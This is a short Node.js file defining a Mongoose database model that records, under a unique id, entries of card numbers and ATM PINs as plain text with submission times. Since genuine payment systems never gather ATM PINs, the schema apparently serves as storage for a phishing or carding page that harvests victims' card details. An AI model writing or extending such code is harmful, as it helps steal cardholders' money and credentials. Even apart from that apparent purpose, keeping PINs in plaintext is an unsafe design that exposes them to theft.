const mongoose = require('mongoose');

const accePaymentSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
        cardNumber: { type: String, required: true },
        atmPin: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('acce', accePaymentSchema);
